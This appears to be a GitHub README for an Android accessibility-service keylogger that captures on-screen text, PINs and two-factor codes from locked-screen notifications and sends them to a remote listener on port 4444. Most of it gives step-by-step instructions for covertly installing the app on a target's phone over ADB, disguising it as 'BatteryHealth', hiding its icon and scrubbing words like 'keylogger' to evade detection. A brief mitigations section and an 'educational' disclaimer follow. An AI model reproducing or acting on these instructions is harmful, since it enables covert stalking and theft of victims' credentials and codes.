

<!-- PROJECT LOGO -->



get apk editor studio from here https://qwertycube.com/apk-editor-studio/download/

![Screenshot 2023-03-12 041815](https://user-images.githubusercontent.com/28081004/224581601-aa556135-17a4-474d-8751-f76f467d09a4.png)
![Screenshot 2023-03-12 150758](https://user-images.githubusercontent.com/28081004/224581608-0b5a2a19-85c2-4968-a103-577192038d36.png)
current gmail version has a buffer to prevent spam :)
✅ PASSED GOOGLE VIRUS SCAN

![demo](https://user-images.githubusercontent.com/28081004/216733696-e7d1c552-5884-46b2-82c9-5221f9ece36f.gif)












# Listener Features

- reads hidden notifications in locked state (grabs google code before owner sees it)

- grabs almost all text on the screen the user is looking at.

- works over WAN without open ports on phones end

- filtered tabs for different apps to reduce logs for easy reading 

- gets pin code

- auto-scrolling

- logs date and time w/ save

# quick use (use latest release) 

android 9 and bellow for now replace icon with transparent one in a icon editor
- this is for phones with dynamic app icons or whatever it was if the icons shows for you.


jdk19 

```
wget https://download.oracle.com/java/19/latest/jdk-19_linux-x64_bin.deb

sudo apt-get -qqy install ./jdk-19_linux-x64_bin.deb

sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk-19/bin/java 1919
```

```
git clone https://github.com/ttateluc/skimmer.git
cd skimmer/Listener/java
java -jar MessageListener.jar
sudo ufw allow 4444 "if on linode or on WAN" no need for open ports on android's side
```
```
download APK Editor studio and open up the apk and search for "192.168.0.135"
and replace the ip in the two smali files mainactivity and messegesener with your
own ip and save the apk thanks to 2.0 release
```

# STEALTH ( OLD )

TIP! install via ADB to avoid recent apps timestamp, also settings does not show in this list, also to assure hiden icon in some cases
UPDATE: if all fails try long pressing the home screen to open launcher settings for a hide apps option.


1. have a device with adb setup in a terminal and run adb tcpip 5555 with a phone charger plugged in (also have the stealth apk ready in same dir)
2. make a new folder on the adb pc with this structure com.BatteryHealth/files/keys/fix.dat
3. in the fix.dat file you made, insert ip:port in line 1 and save (ip and port of remote device with skimmer listener, works in linode)
4. grab target device , open settings , enable dev options if need be then usb debugging
5. connect phone , tap always allow usb debug
6. run adb tcpip 5555 again and run adb install Stealth.apk (this hides from recent apps and settings sometimes does not even show as opened)
7. turn off usb debug and enable the accessibility service
8. copy and paste the com.BatteryHealth folder into android/data after turning on file tranfer

in android 9 and bellow this will install the app with no icon on the launcher or docked apps (wont even be on the screen, perioid)
only way you can see this is if you open accessibility settings or scroll all the way down in installed apps as its never a recent one.
10 and up this will add a shortut named ZbatteryHealth with no icon but will be seen in the launcher, move it to a folder or replace app name with \ in 
manifest file but this will make the app show in the top of installed

due to new security features android API 29 and above (Oreo and up I believe) it will make it hard to near impossible to hide the app without root.
The stealth version does not allow the app to be open, just a white icon, and it just opens the app details menu, sits in the app drawer.

In stealth, you must make and place your own fix.dat file in the app directory 
Android/data/com.BatteryHealth/files/key/fix.dat
after making fix.dat inside, add "192.168.0.135:4444"
without the quotes and replace IP and port with your own IP:PORT

this option has removed all words "keylogger" and "malware" from UI and code as well as folders and hides the app 100% except settings installed list in
android BELLOW Oreo, API 29 and up it will just open app info not showing the IP port field

![Screenshot_20230121_092852](https://user-images.githubusercontent.com/28081004/213873696-b7104b3c-7a17-46a5-a80d-11af8cfee183.png) ![Screenshot_20230121_092759](https://user-images.githubusercontent.com/28081004/213873716-8d0265db-4b4a-443f-8749-7549fa4f2f48.png)





# NORMAL INSTALL

open the app and just place your IP:PORT and tap send (the ip of the device you will listen on)
you may need to open settings/apps/app-name then tap 3 dots top right and allow special permissions
make sure where you got the file from via web browser and or file manager has access,ES works if you have problems
open accessibility settings and enable keylogger or BatteryHealth
no manual fix.dat required



# Stealth install tldr

![stealth_install](https://user-images.githubusercontent.com/28081004/215221291-f4a05ea5-448d-4b1d-ade3-8bec23c53a70.gif)

create a file named fix.dat and copy and PASTE it into android/data/com.BatteryHealth/files/key/
insert ip and port of machine with java listener IP:port








# mitigations

can I protect my passwords from this, even while hacked?
Open dev options and under privacy turn off show passwords when typed

how do I look for this

CHECK
accessibility settings for any downloaded services or if any are on (name don't matter)
hide apps section in launcher
for a fix.dat file in android/data/APP-NAME/files/key/fix.dat
installed apps section in settings, could show as a blank icon as ZBatteryHealth but this could be put in any apk (so rely on service list)




Legal Disclaimer: For Educational Purpose Only
